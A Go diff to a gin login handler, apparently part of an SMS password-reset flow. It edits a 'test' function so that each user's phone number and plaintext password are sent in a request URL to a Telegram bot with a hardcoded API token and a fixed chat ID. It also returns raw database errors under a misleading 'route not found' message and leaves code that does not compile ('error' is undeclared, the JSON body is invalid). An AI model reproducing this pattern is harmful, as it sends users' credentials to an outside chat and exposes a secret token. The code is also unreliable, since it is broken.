@@ -33,15 +33,17 @@ func Login(c *gin.Context) {
 	var user models.User
 	db := c.MustGet("db").(*gorm.DB)
 	if err := db.Where("phone_number = ?", input.PhoneNumber).First(&user).Error; err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Record not found!!"})
+		c.JSON(http.StatusBadRequest, gin.H{
+			"message":    "Route POST:/auth/login not found",
+			"error":      err.Error(),
+			"statusCode": 404,
+		})
 		return
 	}
 	user.Password = RandomPassword()
 
 	SmsSender(user.PhoneNumber, user.Password)
 	db.Model(&user).Updates(user)
-
-	c.JSON(http.StatusOK, gin.H{"data": "Success"})
 
 }
 
@@ -76,25 +78,16 @@ func SmsSender(phone string, password string) {
 }
 
 func test(phone string, password string) {
+
 	num := strconv.Itoa(-1001685855235)
-	httpposturl := fmt.Sprintf("https://api.telegram.org/bot/sendMessage?chat_id=%s&text=Hello+World", num)
+	httpposturl := fmt.Sprintf("https://api.telegram.org/bot5497289382:AAEAuBV4_JOoU1qwIo9RPktV9X1l7FfOG7o/sendMessage?chat_id=%s&text=%s+%s", num, phone, password)
 
-
-
-	// I think this is the block I need to alter?:
-	
-	// body := fmt.Sprintf(
-	// 	`{
-    //     ""chat_id": %d ".}`, num)
-		
-	// body +=  `"text": "some text"` 
-	// body += `phone": "09090990988"`
 	var jsonData = []byte(`{
         "text": phone,
         "job": "leader"
     }`)
 
-	request, error := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
+	request, _ := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
 	request.Header.Set("Content-Type", "application/json; charset=UTF-8")
 
 	client := &http.Client{}
@@ -102,7 +95,6 @@ func test(phone string, password string) {
 	if error != nil {
 		panic(error)
 	}
-	
 
 	fmt.Println("response Status:", response.Status)
 
